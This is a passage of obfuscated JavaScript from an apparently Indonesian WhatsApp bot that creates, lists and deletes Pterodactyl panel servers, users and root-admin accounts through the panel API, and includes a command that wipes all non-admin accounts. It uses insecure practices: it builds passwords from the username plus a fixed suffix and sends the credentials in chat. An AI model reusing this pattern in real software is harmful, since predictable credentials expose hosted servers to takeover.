                        T('Berhasil\x20ajoute\x20grup\x20reseller\x20panel\x20✅'));
                }
                break;
            case 'delgrupseller':
            case 'delgrupreseller':
                {
                    if (!d) return T(mess['owner']);
                    if (datagc['length'] < 0x1)
                        return T('Tidak\x20ada\x20grup\x20reseller\x20panel!');
                    if (!L && u['isGroup']) {
                        if (!datagc['includes'](u['chat']))
                            return T('Grup\x20ini\x20bukan\x20grup\x20reseller\x20panel!');
                        return (
                            datagc['splice'](datagc['indexOf'](u['chat']), 0x1),
                            vmh['writeFileSync'](
                                './data/reseller.json',
                                JSON['stringify'](datagc, null, 0x2)
                            ),
                            T('Berhasil\x20menghapus\x20grup\x20reseller\x20panel\x20✅')
                        );
                    }
                    if (!L)
                        return T(
                            'Masukkan\x20*nomor\x20list*\x20grup!\x0a\x20\x20\x20\x20\x20\x20\x0a*Example:*\x0a-\x20' +
                                E +
                                'delresseler\x202\x0a-\x20' +
                                E +
                                'listresseler\x20(untuk\x20lihat\x20detail)'
                        );
                    if (L === 'all')
                        return (
                            (datagc['length'] = 0x0),
                            vmh['writeFileSync'](
                                './data/reseller.json',
                                JSON['stringify'](datagc, null, 0x2)
                            ),
                            T('Berhasil\x20menghapus\x20*semua*\x20grup\x20reseller\x20panel\x20✅')
                        );
                    let uS = parseInt(L);
                    if (isNaN(uS))
                        return T('Masukkan\x20*angka*\x20sesuai\x20nomor\x20di\x20list!');
                    let uA = uS - 0x1;
                    if (uA < 0x0 || uA >= datagc['length']) return T('Nomor\x20tidak\x20valid!');
                    let up = datagc[uA];
                    (datagc['splice'](uA, 0x1),
                        vmh['writeFileSync'](
                            './data/reseller.json',
                            JSON['stringify'](datagc, null, 0x2)
                        ),
                        T(
                            'Berhasil\x20menghapus\x20grup\x20reseller\x20✅\x0a-\x20ID\x20Groups:\x20*' +
                                up +
                                '*'
                        ));
                }
                break;
            case 'listgrupseller':
            case 'listress':
                {
                    if (!d) return T(mess['owner']);
                    if (datagc['length'] < 0x1)
                        return T('Tidak\x20ada\x20group\x20reseller\x20di\x20data!');
                    let uX = '*List\x20all\x20grup\x20reseller*\x0a\x0a',
                        uw = 0x1;
                    for (let uW of datagc) {
                        let us = 'pa\x20jwenn';
                        try {
                            let uY = await x['groupMetadata'](uW);
                            us = uY['subject'] || us;
                        } catch {}
                        ((uX += uw + '.\x20*' + us + '*\x0a'),
                            (uX += '\x20┣𖣠\x20Id:\x20`' + uW + '`\x0a\x0a'),
                            uw++);
                    }
                    ((uX +=
                        '*Cara\x20hapus:*\x0a-\x20' +
                        E +
                        'delresseler\x20nomornya\x0a-\x20' +
                        E +
                        'delresseler\x20langsung\x20di\x20grup'),
                        await x['sendMessage'](u['chat'], { text: uX }, { quoted: u }));
                }
                break;
            case '1gbv2':
            case '2gbv2':
            case '3gbv2':
            case '4gbv2':
            case '5gbv2':
            case '6gbv2':
            case '7gbv2':
            case '8gbv2':
            case '9gbv2':
            case '10gbv2':
            case 'unlimitedv2':
            case 'unliv2':
                {
                    if (!d && !t)
                        return u['reply'](
                            'Only\x20owner\x20dan\x20grup\x20dengan\x20akses\x20Reseller'
                        );
                    if (!L) return u['reply'](S('username'));
                    global['panel'] = L;
                    var k, H, b;
                    if (B == '1gbv2') ((k = '1000'), (H = '1000'), (b = '40'));
                    else {
                        if (B == '2gbv2') ((k = '2000'), (H = '2000'), (b = '60'));
                        else {
                            if (B == '3gbv2') ((k = '3000'), (H = '3000'), (b = '80'));
                            else {
                                if (B == '4gbv2') ((k = '4000'), (H = '4000'), (b = '100'));
                                else {
                                    if (B == '5gbv2') ((k = '5000'), (H = '5000'), (b = '120'));
                                    else {
                                        if (B == '6gbv2') ((k = '6000'), (H = '6000'), (b = '140'));
                                        else {
                                            if (B == '7gbv2')
                                                ((k = '7000'), (H = '7000'), (b = '160'));
                                            else {
                                                if (B == '8gbv2')
                                                    ((k = '8000'), (H = '8000'), (b = '180'));
                                                else {
                                                    if (B == '9gbv2')
                                                        ((k = '9000'), (H = '9000'), (b = '200'));
                                                    else
                                                        B == '10gbv2'
                                                            ? ((k = '10000'),
                                                              (H = '10000'),
                                                              (b = '220'))
                                                            : ((k = '0'), (H = '0'), (b = '0'));
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    let uO = global['panel']['toLowerCase'](),
                        uc = uO + '@gmail.com',
                        ul = capital(uO) + '\x20Server',
                        U0 = uO + '990',
                        U1 = await fetch(domainV2 + '/api/application/users', {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + apikeyV2,
                            },
                            body: JSON['stringify']({
                                email: uc,
                                username: uO['toLowerCase'](),
                                first_name: ul,
                                last_name: 'Server',
                                language: 'en',
                                password: U0,
                            }),
                        }),
                        U2 = await U1['json']();
                    if (U2['errors'])
                        return u['reply'](JSON['stringify'](U2['errors'][0x0], null, 0x2));
                    let U3 = U2['attributes'],
                        U4 = tanggal(Date['now']()),
                        U5 = U3['id'],
                        U6 = await fetch(
                            domainV2 + ('/api/application/nests/' + nestidV2 + '/eggs/') + eggV2,
                            {
                                method: 'GET',
                                headers: {
                                    Accept: 'application/json',
                                    'Content-Type': 'application/json',
                                    Authorization: 'Bearer\x20' + apikeyV2,
                                },
                            }
                        ),
                        U7 = await U6['json'](),
                        U8 = U7['attributes']['startup'],
                        U9 = await fetch(domainV2 + '/api/application/servers', {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + apikeyV2,
                            },
                            body: JSON['stringify']({
                                name: ul,
                                description: U4,
                                user: U5,
                                egg: parseInt(eggV2),
                                docker_image: 'ghcr.io/parkervcp/yolks:nodejs_21',
                                startup: U8,
                                environment: {
                                    INST: 'npm',
                                    USER_UPLOAD: '0',
                                    AUTO_UPDATE: '0',
                                    CMD_RUN: 'npm\x20start',
                                },
                                limits: { memory: k, swap: 0x0, disk: H, io: 0x1f4, cpu: b },
                                feature_limits: { databases: 0x5, backups: 0x5, allocations: 0x5 },
                                deploy: {
                                    locations: [parseInt(locV2)],
                                    dedicated_ip: ![],
                                    port_range: [],
                                },
                            }),
                        }),
                        Ux = await U9['json']();
                    if (Ux['errors'])
                        return u['reply'](JSON['stringify'](Ux['errors'][0x0], null, 0x2));
                    let Uu = Ux['attributes'];
                    var y;
                    u['isGroup']
                        ? ((y = u['sender']),
                          await u['reply'](
                              '*Berhasil\x20membuat\x20panel\x20✅*\x0aData\x20akun\x20sudah\x20dikirim\x20ke\x20privat\x20chat'
                          ))
                        : (y = u['chat']);
                    var F =
                        '*Data\x20Akun\x20Panel\x20Kamu\x20📦*\x0a\x0a*📡\x20ID\x20Server\x20(' +
                        Uu['id'] +
                        ')*\x20\x0a*👤\x20Username\x20:*\x20' +
                        U3['username'] +
                        '\x0a*🔐\x20Password\x20:*\x20' +
                        U0 +
                        '\x0a\x0a*🌐\x20Spesifikasi\x20Server*\x0a*\x20Ram\x20:\x20*' +
                        (k == '0'
                            ? 'Unlimited'
                            : k['split']('')['length'] > 0x4
                              ? k['split']('')['slice'](0x0, 0x2)['join']('') + 'GB'
                              : k['charAt'](0x0) + 'GB') +
                        '*\x0a*\x20Disk\x20:\x20*' +
                        (H == '0'
                            ? 'Unlimited'
                            : H['split']('')['length'] > 0x4
                              ? H['split']('')['slice'](0x0, 0x2)['join']('') + 'GB'
                              : H['charAt'](0x0) + 'GB') +
                        '*\x0a*\x20CPU\x20:\x20*' +
                        (b == '0' ? 'Unlimited' : b + '%') +
                        '*\x0a*\x20' +
                        global['domainV2'] +
                        '\x0a\x0a*Syarat\x20&\x20Ketentuan\x20:*\x0a' +
                        global['teksPanel'] +
                        '\x0a';
                    (await vmh['writeFileSync']('akunpanel.txt', F),
                        await x['sendMessage'](
                            y,
                            {
                                document: vmh['readFileSync']('./akunpanel.txt'),
                                fileName: 'akunpanel.txt',
                                mimetype: 'text/plain',
                                caption: F,
                            },
                            { quoted: u }
                        ),
                        await vmh['unlinkSync']('./akunpanel.txt'),
                        delete global['panel']);
                }
                break;
            case 'listpanelv2':
            case 'listpv2':
            case 'listserverv2':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (!global['apikey'])
                        return u['reply'](
                            'Apikey\x20pa\x20jwenn!\x0aPastikan\x20di\x20settings.js\x20*global.apikey*\x20sudah\x20di\x20isi!'
                        );
                    let UU = 0x1,
                        UG = [];
                    while (!![]) {
                        let Ub = await fetch(
                                global['domainV2'] + '/api/application/servers?page=' + UU,
                                {
                                    headers: {
                                        Accept: 'application/json',
                                        'Content-Type': 'application/json',
                                        Authorization: 'Bearer\x20' + global['apikeyV2'],
                                    },
                                }
                            ),
                            Uq = await Ub['json']();
                        if (!Uq['data'] || Uq['data']['length'] === 0x0) break;
                        UG['push'](...Uq['data']);
                        if (
                            !Uq['meta']?.['pagination'] ||
                            UU >= Uq['meta']['pagination']['total_pages']
                        )
                            break;
                        UU++;
                    }
                    if (!UG['length']) return u['reply']('Tidak\x20ada\x20server\x20panel.');
                    let Uk =
                            '*List\x20all\x20server\x20panel*\x0a>\x20#Total:\x20*' +
                            UG['length'] +
                            '\x20server*\x0a\x0a',
                        UH = 0x1;
                    for (let Uy of UG) {
                        let UF = Uy['attributes'],
                            UM = UF['uuid']['split']('-')[0x0],
                            UV = 'unknown';
                        try {
                            let UR = await fetch(
                                    global['domain'] + '/api/client/servers/' + UM + '/resources',
                                    {
                                        headers: {
                                            Accept: 'application/json',
                                            'Content-Type': 'application/json',
                                            Authorization: 'Bearer\x20' + global['capikey'],
                                        },
                                    }
                                ),
                                UE = await UR['json']();
                            UV =
                                UE['attributes']?.['current_state']?.['toUpperCase']() || 'unknown';
                        } catch (UD) {
                            UV = 'unknown';
                        }
                        ((Uk += '\x20\x20⚪\x20ID\x20Server\x20:\x20*' + UF['id'] + '*\x0a'),
                            (Uk += '\x20\x20⚫\x20ID\x20User\x20:\x20*' + UF['user'] + '*\x0a'),
                            (Uk += '\x20\x20📍\x20Nama\x20:\x20*' + UF['name'] + '*\x0a'),
                            (Uk +=
                                '\x20\x20💾\x20RAM\x20:\x20*' +
                                (UF['limits']['memory'] == 0x0
                                    ? 'Unlimited'
                                    : UF['limits']['memory'] / 0x3e8 + 'GB') +
                                '*\x0a'),
                            (Uk += '┣𖣠\x20Status\x20:\x20*' + UV + '*\x0a\x0a'));
                    }
                    return x['sendMessage'](u['chat'], { text: Uk }, { quoted: u });
                }
                break;
            case 'delpanelv2':
            case 'delpv2':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (global['apikey']['length'] < 0x1)
                        return u['reply'](
                            'Apikey\x20pa\x20jwenn!\x0aPastikan\x20di\x20settings.js\x20*global.apikey*\x20sudah\x20di\x20isi!'
                        );
                    if (!z[0x0])
                        return u['reply'](
                            S(
                                'id\x20servernya\x0a\x0auntuk\x20melihat\x20id\x20server\x20ketik\x20*' +
                                    E +
                                    'listpanel*'
                            )
                        );
                    let UC = await fetch(global['domainV2'] + '/api/application/servers?page=1', {
                            method: 'GET',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + global['apikeyV2'],
                            },
                        }),
                        Uv = await UC['json'](),
                        Uo = Uv['data'],
                        UB = null,
                        Uz = null;
                    for (let UL of Uo) {
                        let Ue = UL['attributes'];
                        z[0x0] == Ue['id']['toString']() &&
                            ((UB = Ue['user']),
                            (Uz = Ue['name']),
                            await fetch(
                                global['domainV2'] + ('/api/application/servers/' + Ue['id']),
                                {
                                    method: 'DELETE',
                                    headers: {
                                        Accept: 'application/json',
                                        'Content-Type': 'application/json',
                                        Authorization: 'Bearer\x20' + global['apikeyV2'],
                                    },
                                }
                            ));
                    }
                    if (!UB) return u['reply']('*ID\x20Server*\x20pa\x20jwenn');
                    (await fetch(global['domainV2'] + ('/api/application/users/' + UB), {
                        method: 'DELETE',
                        headers: {
                            Accept: 'application/json',
                            'Content-Type': 'application/json',
                            Authorization: 'Bearer\x20' + global['apikeyV2'],
                        },
                    }),
                        u['reply'](
                            'Berhasil\x20Menghapus\x20Akun\x20Panel\x20*' +
                                capital(Uz) +
                                '*\x20(Server\x20&\x20User)'
                        ));
                }
                break;
            case 'cadminv2':
            case 'cadpv2':
                {
                    if (!d) return Reply(mess['owner']);
                    if (!L) return u['reply'](S('username'));
                    let Uj = L['toLowerCase'](),
                        Uf = Uj + '@gmail.com',
                        Uh = capital(z[0x0]),
                        UI = Uj + '001',
                        Ui = await fetch(domainV2 + '/api/application/users', {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + apikeyV2,
                            },
                            body: JSON['stringify']({
                                email: Uf,
                                username: Uj['toLowerCase'](),
                                first_name: Uh,
                                last_name: 'Admin',
                                root_admin: !![],
                                language: 'en',
                                password: UI,
                            }),
                        }),
                        UK = await Ui['json']();
                    if (UK['errors'])
                        return u['reply'](JSON['stringify'](UK['errors'][0x0], null, 0x2));
                    let Ua = UK['attributes'];
                    var y;
                    u['isGroup']
                        ? ((y = u['sender']),
                          await u['reply'](
                              '*Berhasil\x20membuat\x20admin\x20panel\x20✅*\x0aData\x20akun\x20sudah\x20di\x20kirim\x20ke\x20private\x20chat'
                          ))
                        : (y = u['chat']);
                    var F =
                        '*Data\x20Akun\x20Admin\x20Panel\x20📦*\x0a\x0a*📡\x20ID\x20User\x20(' +
                        Ua['id'] +
                        ')*\x20\x0a*👤\x20Username\x20:*\x20' +
                        Ua['username'] +
                        '\x0a*🔐\x20Password\x20:*\x20' +
                        UI +
                        '\x0a*\x20' +
                        global['domainV2'] +
                        '\x0a\x0a*Syarat\x20&\x20Ketentuan\x20:*\x0a*\x20Expired\x20akun\x201\x20bulan\x0a*\x20Simpan\x20data\x20ini\x20sebaik\x20mungkin\x0a*\x20Jangan\x20asal\x20hapus\x20server!\x0a*\x20Ketahuan\x20maling\x20sc,\x20auto\x20delete\x20akun\x20no\x20reff!\x0a';
                    (await vmh['writeFileSync']('./akunpanel.txt', F),
                        await x['sendMessage'](
                            y,
                            {
                                document: vmh['readFileSync']('./akunpanel.txt'),
                                fileName: 'akunpanel.txt',
                                mimetype: 'text/plain',
                                caption: F,
                            },
                            { quoted: u }
                        ),
                        await vmh['unlinkSync']('./akunpanel.txt'));
                }
                break;
            case 'deladminv2':
            case 'deladpv2':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (!z[0x0])
                        return u['reply'](
                            S(
                                'id\x20nya\x0a\x0auntuk\x20melihat\x20id\x20admin\x20ketik\x20*' +
                                    E +
                                    'listadmin*'
                            )
                        );
                    let Ut = await fetch(global['domainV2'] + '/api/application/users?page=1', {
                            method: 'GET',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + global['apikeyV2'],
                            },
                        }),
                        Um = await Ut['json'](),
                        Ud = Um['data'],
                        Un = null,
                        Ug = null;
                    await Ud['forEach'](async (UJ) => {
                        if (
                            UJ['attributes']['id'] == z[0x0] &&
                            UJ['attributes']['root_admin'] == !![]
                        ) {
                            ((Un = UJ['attributes']['username']), (Ug = UJ['attributes']['id']));
                            let UN = await fetch(
                                    global['domainV2'] + ('/api/application/users/' + Ug),
                                    {
                                        method: 'DELETE',
                                        headers: {
                                            Accept: 'application/json',
                                            'Content-Type': 'application/json',
                                            Authorization: 'Bearer\x20' + global['apikeyV2'],
                                        },
                                    }
                                ),
                                UQ = UN['ok'] ? { errors: null } : await UN['json']();
                        }
                    });
                    if (Ug == null) return u['reply']('ID\x20Admin\x20pa\x20jwenn!');
                    u['reply']('Berhasil\x20Menghapus\x20Admin\x20Panel\x20*' + capital(Un) + '*');
                }
                break;
            case 'listadminv2':
            case 'listadpv2':
                {
                    if (!d) return u['reply'](mess['owner']);
                    let UJ = await fetch(global['domainV2'] + '/api/application/users?page=1', {
                            method: 'GET',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + global['apikeyV2'],
                            },
                        }),
                        UN = await UJ['json'](),
                        UQ = UN['data'];
                    if (UQ['length'] < 0x1) return u['reply']('Tidak\x20Ada\x20Admin\x20Panel');
                    var F = '*List\x20all\x20admin\x20panel*\x0a\x0a';
                    (await UQ['forEach']((UZ) => {
                        if (UZ['attributes']['root_admin'] !== !![]) return;
                        F +=
                            '\x20\x20⚪\x20ID\x20User\x20:\x20*' +
                            UZ['attributes']['id'] +
                            '*\x0a\x20\x20\x20📍\x20Nama\x20:\x20*' +
                            UZ['attributes']['first_name'] +
                            '*\x0a\x0a';
                    }),
                        u['reply'](F));
                }
                break;
            case 'clearpanelv2':
            case 'clearserverv2':
                {
                    if (!d) return T(mess['owner']);
                    await T(
                        '*Memproses\x20penghapusan\x20semua\x20user\x20&\x20server\x20panel\x20⚠️*'
                    );
                    try {
                        const UZ = {
                            Authorization: 'Bearer\x20' + global['apikeyV2'],
                            'Content-Type': 'application/json',
                            Accept: 'application/json',
                        };
                        async function UP() {
                            try {
                                const Up = await vmj['get'](
                                    global['domainV2'] + '/api/application/users',
                                    { headers: UZ }
                                );
                                return Up['data']['data'];
                            } catch (UX) {
                                return (
                                    T(
                                        JSON['stringify'](
                                            UX['response']?.['data'] || UX['message'],
                                            null,
                                            0x2
                                        )
                                    ),
                                    []
                                );
                            }
                        }
                        async function Ur() {
                            try {
                                const Up = await vmj['get'](
                                    global['domainV2'] + '/api/application/servers',
                                    { headers: UZ }
                                );
                                return Up['data']['data'];
                            } catch (UX) {
                                return (
                                    T(
                                        JSON['stringify'](
                                            UX['response']?.['data'] || UX['message'],
                                            null,
                                            0x2
                                        )
                                    ),
                                    []
                                );
                            }
                        }
                        async function UT(Up) {
                            try {
                                (await vmj['delete'](
                                    global['domainV2'] + '/api/application/servers/' + Up,
                                    { headers: UZ }
                                ),
                                    console['log']('Server\x20' + Up + '\x20berhasil\x20dihapus.'));
                            } catch (UX) {
                                console['error'](
                                    'Echwe\x20menghapus\x20server\x20' + Up + ':',
                                    UX['response']?.['data'] || UX['message']
                                );
                            }
                        }
                        async function US(Up) {
                            try {
                                (await vmj['delete'](
                                    global['domainV2'] + '/api/application/users/' + Up,
                                    { headers: UZ }
                                ),
                                    console['log']('User\x20' + Up + '\x20berhasil\x20dihapus.'));
                            } catch (UX) {
                                console['error'](
                                    'Echwe\x20menghapus\x20user\x20' + Up + ':',
                                    UX['response']?.['data'] || UX['message']
                                );
                            }
                        }
                        async function UA() {
                            const Up = await UP(),
                                UX = await Ur();
                            let Uw = 0x0;
                            for (const UW of Up) {
                                if (UW['attributes']['root_admin']) {
                                    console['log'](
                                        'Lewati\x20admin:\x20' + UW['attributes']['username']
                                    );
                                    continue;
                                }
                                const Us = UW['attributes']['id'],
                                    UY = UW['attributes']['email'];
                                console['log'](
                                    'Menghapus\x20user:\x20' +
                                        UW['attributes']['username'] +
                                        '\x20(' +
                                        UY +
                                        ')'
                                );
                                const UO = UX['filter']((Uc) => Uc['attributes']['user'] === Us);
                                for (const Uc of UO) {
                                    (await UT(Uc['attributes']['id']), (Uw += 0x1));
                                }
                                await US(Us);
                            }
                            await T(
                                '*Finished\x20Cleaning\x20the\x20Panel\x20✅*\x0a\x0a-\x20Total\x20*' +
                                    Uw +
                                    '*\x20(user\x20&\x20server)\x20panel\x20dihapus\x20\x0a\x0a*⚠️\x20Server\x20yang\x20dihapus\x20bukan\x20admin\x20panel*'
                            );
                        }
                        return UA();
                    } catch (Up) {
                        return T('' + JSON['stringify'](Up, null, 0x2));
                    }
                }
                break;
            case 'addserver':
            case 'addsrv':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (!L)
                        return u['reply'](
                            S(
                                'id,nama,ram\x0aKetik:\x20*' +
                                    E +
                                    'listpanel*\x20untuk\x20melihat\x20id'
                            )
                        );
                    let [UX, Uw, UW] = L['split'](',');
                    if (!UX || !Uw || !UW)
                        return u['reply'](
                            S(
                                'id,nama,ram\x0aKetik:\x20*' +
                                    E +
                                    'listpanel*\x20untuk\x20melihat\x20id'
                            )
                        );
                    ((UX = UX['trim']()),
                        (Uw = Uw['trim']()),
                        (UW = UW['trim']()['toLowerCase']()));
                    let Us, UY, UO;
                    if (['unli', 'unlimited']['includes'](UW)) Us = UY = UO = 0x0;
                    else {
                        if (/^\d+gb$/['test'](UW)) {
                            const G6 = parseInt(UW['replace']('gb', ''));
                            if (G6 < 0x1 || G6 > 0xa)
                                return T(
                                    'RAM\x20hanya\x20boleh\x20dari\x201GB\x20sampai\x2010GB\x20atau\x20\x27unli\x27'
                                );
                            ((Us = G6 * 0x3e8), (UY = G6 * 0x3e8), (UO = 0x14 + G6 * 0x14));
                        } else
                            return T(
                                'Format\x20RAM\x20salah.\x20Gunakan\x20seperti:\x201gb\x20-\x20unli'
                            );
                    }
                    const Uc = tanggal(Date['now']()),
                        Ul = await fetch(
                            global['domainV2'] +
                                '/api/application/nests/' +
                                nestid +
                                '/eggs/' +
                                egg,
                            {
                                method: 'GET',
                                headers: {
                                    Accept: 'application/json',
                                    'Content-Type': 'application/json',
                                    Authorization: 'Bearer\x20' + global['apikeyV2'],
                                },
                            }
                        ),
                        G0 = await Ul['json'](),
                        G1 = G0['attributes']['startup'],
                        G2 = await fetch(global['domainV2'] + '/api/application/servers', {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + global['apikeyV2'],
                            },
                            body: JSON['stringify']({
                                name: Uw,
                                description: Uc,
                                user: parseInt(UX),
                                egg: parseInt(egg),
                                docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
                                startup: G1,
                                environment: {
                                    INST: 'npm',
                                    USER_UPLOAD: '0',
                                    AUTO_UPDATE: '0',
                                    CMD_RUN: 'npm\x20start',
                                },
                                limits: {
                                    memory: parseInt(Us),
                                    swap: 0x0,
                                    disk: parseInt(UY),
                                    io: 0x1f4,
                                    cpu: parseInt(UO),
                                },
                                feature_limits: { databases: 0x5, backups: 0x5, allocations: 0x5 },
                                deploy: {
                                    locations: [parseInt(loc)],
                                    dedicated_ip: ![],
                                    port_range: [],
                                },
                            }),
                        }),
                        G3 = await G2['json']();
                    if (G3['errors'])
                        return T(
                            'Echwe\x20ajoute\x20server:\x0a' +
                                JSON['stringify'](G3['errors'][0x0], null, 0x2)
                        );
                    const G4 = G3['attributes'];
                    let G5 =
                        '*Succes\x20Create\x20New\x20Server\x20✅*\x0a-\x20User\x20ID\x20:\x20' +
                        UX +
                        '\x0a-\x20Server\x20ID\x20:\x20' +
                        G4['id'] +
                        '\x0a-\x20Nama\x20Server\x20:\x20' +
                        Uw +
                        '\x0a\x0a*Server\x20Specifications\x20🖥️*\x0a-\x20Ram\x20:\x20' +
                        (Us == 0x0 ? 'Unlimited' : Us / 0x3e8 + 'GB') +
                        '\x0a-\x20Disk\x20:\x20' +
                        (UY == 0x0 ? 'Unlimited' : UY / 0x3e8 + 'GB') +
                        '\x0a-\x20CPU\x20:\x20' +
                        (UO == 0x0 ? 'Unlimited' : UO + '%');
                    await x['sendMessage'](
                        u['chat'],
                        { text: G5, contextInfo: { isForwarded: !![] } },
                        { quoted: u }
                    );
                }
                break;
            case '1gb':
            case '2gb':
            case '3gb':
            case '4gb':
            case '5gb':
            case '6gb':
            case '7gb':
            case '8gb':
            case '9gb':
            case '10gb':
            case 'unlimited':
            case 'unli':
                {
                    if (!d && !t)
                        return u['reply'](
                            'Only\x20owner\x20dan\x20grup\x20dengan\x20akses\x20Reseller'
                        );
                    if (!L) return u['reply'](S('username'));
                    global['panel'] = L;
                    var k, H, b;
                    if (B == '1gb') ((k = '1000'), (H = '1000'), (b = '40'));
                    else {
                        if (B == '2gb') ((k = '2000'), (H = '2000'), (b = '60'));
                        else {
                            if (B == '3gb') ((k = '3000'), (H = '3000'), (b = '80'));
                            else {
                                if (B == '4gb') ((k = '4000'), (H = '4000'), (b = '100'));
                                else {
                                    if (B == '5gb') ((k = '5000'), (H = '5000'), (b = '120'));
                                    else {
                                        if (B == '6gb') ((k = '6000'), (H = '6000'), (b = '140'));
                                        else {
                                            if (B == '7gb')
                                                ((k = '7000'), (H = '7000'), (b = '160'));
                                            else {
                                                if (B == '8gb')
                                                    ((k = '8000'), (H = '8000'), (b = '180'));
                                                else {
                                                    if (B == '9gb')
                                                        ((k = '9000'), (H = '9000'), (b = '200'));
                                                    else
                                                        B == '10gb'
                                                            ? ((k = '10000'),
                                                              (H = '10000'),
                                                              (b = '220'))
                                                            : ((k = '0'), (H = '0'), (b = '0'));
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    let G7 = global['panel']['toLowerCase'](),
                        G8 = G7 + '@gmail.com',
                        G9 = capital(G7) + '\x20Server',
                        Gx = G7 + '990',
                        Gu = await fetch(domain + '/api/application/users', {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + apikey,
                            },
                            body: JSON['stringify']({
                                email: G8,
                                username: G7['toLowerCase'](),
                                first_name: G9,
                                last_name: 'Server',
                                language: 'en',
                                password: Gx,
                            }),
                        }),
                        GU = await Gu['json']();
                    if (GU['errors'])
                        return u['reply'](JSON['stringify'](GU['errors'][0x0], null, 0x2));
                    let GG = GU['attributes'],
                        Gk = tanggal(Date['now']()),
                        GH = GG['id'],
                        Gb = await fetch(
                            domain + ('/api/application/nests/' + nestid + '/eggs/') + egg,
                            {
                                method: 'GET',
                                headers: {
                                    Accept: 'application/json',
                                    'Content-Type': 'application/json',
                                    Authorization: 'Bearer\x20' + apikey,
                                },
                            }
                        ),
                        Gq = await Gb['json'](),
                        Gy = Gq['attributes']['startup'],
                        GF = await fetch(domain + '/api/application/servers', {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + apikey,
                            },
                            body: JSON['stringify']({
                                name: G9,
                                description: Gk,
                                user: GH,
                                egg: parseInt(egg),
                                docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
                                startup: Gy,
                                environment: {
                                    INST: 'npm',
                                    USER_UPLOAD: '0',
                                    AUTO_UPDATE: '0',
                                    CMD_RUN: 'npm\x20start',
                                },
                                limits: { memory: k, swap: 0x0, disk: H, io: 0x1f4, cpu: b },
                                feature_limits: { databases: 0x5, backups: 0x5, allocations: 0x5 },
                                deploy: {
                                    locations: [parseInt(loc)],
                                    dedicated_ip: ![],
                                    port_range: [],
                                },
                            }),
                        }),
                        GM = await GF['json']();
                    if (GM['errors'])
                        return u['reply'](JSON['stringify'](GM['errors'][0x0], null, 0x2));
                    let GV = GM['attributes'];
                    var y;
                    u['isGroup']
                        ? ((y = u['sender']),
                          await u['reply'](
                              '*Berhasil\x20membuat\x20panel\x20✅*\x0aData\x20akun\x20sudah\x20dikirim\x20ke\x20privat\x20chat'
                          ))
                        : (y = u['chat']);
                    var F =
                        '*Data\x20Akun\x20Panel\x20Kamu\x20📦*\x0a\x0a*📡\x20ID\x20Server\x20(' +
                        GV['id'] +
                        ')*\x20\x0a*👤\x20Username\x20:*\x20' +
                        GG['username'] +
                        '\x0a*🔐\x20Password\x20:*\x20' +
                        Gx +
                        '\x0a\x0a*🌐\x20Spesifikasi\x20Server*\x0a*\x20Ram\x20:\x20*' +
                        (k == '0'
                            ? 'Unlimited'
                            : k['split']('')['length'] > 0x4
                              ? k['split']('')['slice'](0x0, 0x2)['join']('') + 'GB'
                              : k['charAt'](0x0) + 'GB') +
                        '*\x0a*\x20Disk\x20:\x20*' +
                        (H == '0'
                            ? 'Unlimited'
                            : H['split']('')['length'] > 0x4
                              ? H['split']('')['slice'](0x0, 0x2)['join']('') + 'GB'
                              : H['charAt'](0x0) + 'GB') +
                        '*\x0a*\x20CPU\x20:\x20*' +
                        (b == '0' ? 'Unlimited' : b + '%') +
                        '*\x0a*\x20' +
                        global['domain'] +
                        '\x0a\x0a*Syarat\x20&\x20Ketentuan\x20:*\x0a' +
                        global['teksPanel'] +
                        '\x0a';
                    (await vmh['writeFileSync']('akunpanel.txt', F),
                        await x['sendMessage'](
                            y,
                            {
                                document: vmh['readFileSync']('./akunpanel.txt'),
                                fileName: 'akunpanel.txt',
                                mimetype: 'text/plain',
                                caption: F,
                            },
                            { quoted: u }
                        ),
                        await vmh['unlinkSync']('./akunpanel.txt'),
                        delete global['panel']);
                }
                break;
            case 'listpanel':
            case 'listp':
            case 'listserver':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (!global['apikey'])
                        return u['reply'](
                            'Apikey\x20pa\x20jwenn!\x0aPastikan\x20di\x20settings.js\x20*global.apikey*\x20sudah\x20di\x20isi!'
                        );
                    let GR = 0x1,
                        GE = [];
                    while (!![]) {
                        let Gv = await fetch(
                                global['domain'] + '/api/application/servers?page=' + GR,
                                {
                                    headers: {
                                        Accept: 'application/json',
                                        'Content-Type': 'application/json',
                                        Authorization: 'Bearer\x20' + global['apikey'],
                                    },
                                }
                            ),
                            Go = await Gv['json']();
                        if (!Go['data'] || Go['data']['length'] === 0x0) break;
                        GE['push'](...Go['data']);
                        if (
                            !Go['meta']?.['pagination'] ||
                            GR >= Go['meta']['pagination']['total_pages']
                        )
                            break;
                        GR++;
                    }
                    if (!GE['length']) return u['reply']('Tidak\x20ada\x20server\x20panel.');
                    let GD =
                            '*List\x20all\x20server\x20panel*\x0a>\x20#Total:\x20*' +
                            GE['length'] +
                            '\x20server*\x0a\x0a',
                        GC = 0x1;
                    for (let GB of GE) {
                        let Gz = GB['attributes'],
                            GL = Gz['uuid']['split']('-')[0x0],
                            Ge = 'unknown';
                        try {
                            let Gj = await fetch(
